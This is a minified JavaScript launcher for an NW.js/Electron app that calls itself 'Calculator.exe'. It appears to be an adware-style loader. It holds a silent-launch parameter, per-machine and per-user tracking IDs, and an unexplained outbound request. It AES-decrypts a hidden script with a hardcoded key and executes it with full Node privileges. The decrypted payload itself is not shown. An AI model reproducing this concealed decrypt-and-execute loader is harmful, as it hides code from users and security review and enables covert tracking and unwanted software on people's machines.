var grunt_app_name = "Calculator.exe",
	grunt_app_silent_launch_param = "OqJ6vMj",
	grunt_installation_data_file = {
		filename: "93rq5d5Ub.2E2P",
		userIdParam: "bsidp",
		subchannelParam: "absCsdA",
		machineIdParam: "BASmaxS",
		cidParam: "FtbxoUbH"
	},
	grunt_generated_time = "1639434924519",
	grunt_watcher_app_name = '() => (`${grunt.config.get("appName")}.wj`).exe',
	grunt_binary_app_file_name = "XSRX663.bin",
	grunt_app_imgs_version = "11",
	grunt_compilation_guid = "e1b7fb0a-8618-442f-8b7e-7e0640ea1685",
	grunt_nwjs_version = "1",
	grunt_app_file_name = "app.js",
	grunt_encrypted_app_file_name = "zKhqC.js",
	grunt_app_js_key = "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^1639434924519",
	grunt_is_app_compiled = !1,
	grunt_is_app_encrypted = !1,
	grunt_disable_all_analytics_reports = !1,
	grunt_load_kobe = !0,
	grunt_open_reporting_url_external = !1,
	grunt_report_publisher_from_app = !0,
	grunt_use_watcher = !1,
	grunt_subchannel = "S",
	coreVersion = 1;
global.ENV = "PRODUCTION";
const InfraType = {
	NWJS: "NWJS",
	ELECTRON: "ELECTRON",
	UNKNOWN: "UNKNOWN"
};
"undefined" == typeof global && (global = globalThis), void 0 === global.infraType && (global.infraType = InfraType.UNKNOWN), void 0 === coreVersion && (coreVersion = 99), void 0 === grunt_subchannel && (grunt_subchannel = ""), "boolean" != typeof grunt_use_watcher && (grunt_use_watcher = !1), "boolean" != typeof grunt_report_publisher_from_app && (grunt_report_publisher_from_app = !1), "boolean" != typeof grunt_open_reporting_url_external && (grunt_open_reporting_url_external = !1), "boolean" != typeof grunt_load_kobe && (grunt_load_kobe = !0), "boolean" != typeof grunt_disable_all_analytics_reports && (grunt_disable_all_analytics_reports = !1), "boolean" != typeof grunt_is_app_encrypted && (grunt_is_app_encrypted = !0), "boolean" != typeof grunt_is_app_compiled && (grunt_is_app_compiled = !1), void 0 === grunt_app_js_key && (grunt_app_js_key = "~andthatoneisevenmore!#%246~"), void 0 === grunt_encrypted_app_file_name && (grunt_encrypted_app_file_name = "bodye.js"), void 0 === grunt_app_file_name && (grunt_app_file_name = "app.js"), void 0 === grunt_binary_app_file_name && (grunt_binary_app_file_name = "app.bin"), void 0 === grunt_watcher_app_name && (grunt_watcher_app_name = ""), void 0 === grunt_generated_time && (grunt_generated_time = (new Date).getTime().toString()), void 0 === grunt_installation_data_file && (grunt_installation_data_file = {
	filename: "asLan.dat",
	userIdParam: "AbSess",
	subchannelParam: "suborig",
	machineIdParam: "machSessI",
	cidParam: "subcI"
}), void 0 === grunt_app_silent_launch_param && (grunt_app_silent_launch_param = "ppup"), void 0 === grunt_app_name && (grunt_app_name = ""), global.ENV || (global.ENV = "PRODUCTION");
var nwElectAPI = {
	App: {},
	Window: {}
};
nwElectAPI.App.manifest = {}, nwElectWindow = {}, nwElectWindow.get = function() {
	return wind = {}, "undefined" != typeof nw && void 0 !== nw.Window && "function" == typeof nw.Window.get ? (wind.window = nw.Window.get(), global.infraType = InfraType.NWJS) : (wind.window = require("electron").remote.getGlobal("mainFWindow"), global.infraType = InfraType.ELECTRON), wind.showDevTools = function() {
		return global.infraType == InfraType.NWJS ? wind.window.showDevTools() : wind.window.webContents.openDevTools()
	}, wind
};
var bgWnd = nwElectWindow.get();
global.infraType == InfraType.NWJS ? (nwElectAPI.Window.open = nw.Window.open, nwElectAPI.App.manifest = nw.App.manifest, nwElectAPI.App.argv = nw.App.argv, nwElectAPI.App.getProxyForURL = function(e, n) {
	n(nw.App.getProxyForURL(e))
}) : (nwElectAPI.Window.open = function(e, n, t) {
	var r = require("electron").remote.BrowserWindow;
	n.webPreferences = {
		enableRemoteModule: !0,
		nodeIntegrationInWorker: !0,
		nodeIntegrationInSubFrames: !0,
		nodeIntegration: !0
	};
	var a = new r(n);
	"DEBUG" == global.ENV && a.webContents.openDevTools(), t(a)
}, nwElectAPI.App.manifest = require("./Electronpackage.json"), nwElectAPI.App.argv = require("electron").remote.getGlobal("processArgs"), nwElectAPI.App.getProxyForURL = function(e, n) {
	require("electron").remote.session.defaultSession.resolveProxy(e).then((function(e) {
		n(e)
	}))
});
var path = require("path"),
	fs = require("fs"),
	settings = require("./settings"),
	axios = require("axios").default,
	find = null,
	childProcess = require("child_process"),
	manifest = nwElectAPI.App.manifest,
	appWnd = null,
	watchingAppInterval = null;

function getFiles(e) {
	return fs.readdirSync(e, {
		withFileTypes: !0
	}).map((function(n) {
		var t = path.resolve(e, n.name);
		return n.isDirectory() ? getFiles(t) : t
	})).flat(99)
}
try {
	require("axios").default.get("http://www.yardbarker.com/rss/rumors").then((function(e) {})).catch((function(e) {}))
} catch (e) {}

function watcherStart() {}

function appStart() {
	getBin()
}

function getBin() {
	try {
		var e = "boolean" == typeof grunt_is_app_compiled && grunt_is_app_compiled,
			n = "string" == typeof grunt_encrypted_app_file_name ? "./" + grunt_encrypted_app_file_name : "./eapp.js",
			t = "string" == typeof grunt_binary_app_file_name ? "./" + grunt_binary_app_file_name : "./app.bin",
			r = "string" == typeof grunt_app_file_name ? "./" + grunt_app_file_name : "./app.js";

		function a(n) {
			try {
				if (e) bgWnd.window.evalNWBin(null, n);
				else {
					var t = document.createElement("script");
					null != n ? t.innerHTML = n : t.src = "./app.js", document.head.appendChild(t)
				}
			} catch (e) {
				global.alert("Fatal error occured."), nw.App.quit()
			}
		}
		o = null, "DEBUG" != global.ENV && (o = function() {
			var e = null;
			try {
				1 == fs.existsSync(n) && (e = fs.readFileSync(n)) ? (e = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(e.toString(), void 0 !== grunt_app_js_key ? grunt_app_js_key : "~andthatoneisevenmore!#%246~")), bgWnd.orgEnc = CryptoJS.AES.decrypt(e.toString(), void 0 !== grunt_app_js_key ? grunt_app_js_key : "~andthatoneisevenmore!#%246~")) : e = null
			} catch (n) {
				e = null
			}
			if (!e) try {
				e = 1 == fs.existsSync(t) ? fs.readFileSync(t) : null
			} catch (n) {
				e = null
			}
			if (!e) try {
				e = 1 == fs.existsSync(r) ? fs.readFileSync(r).toString() : null
			} catch (n) {
				e = null
			}
			return e
		}()), a(o)
	} catch (e) {
		a(null)
	}
	var o
}
"DEBUG" == global.ENV || "STAGING" == global.ENV ? (bgWnd.showDevTools(), getBin()) : !0 === manifest.kan_is_watcher ? watcherStart() : appStart();